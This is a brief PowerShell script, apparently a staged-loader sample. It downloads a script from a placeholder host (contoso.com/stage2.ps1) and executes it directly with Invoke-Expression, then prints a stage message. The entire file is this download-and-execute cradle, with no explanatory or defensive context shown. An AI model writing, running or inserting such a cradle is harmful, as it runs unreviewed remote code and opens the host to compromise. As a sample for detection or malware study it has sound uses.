[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://contoso.com/stage2.ps1",
    [int]$ConnectionTimeout = 50
)
IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content
Write-Output "stage 5 initialized"
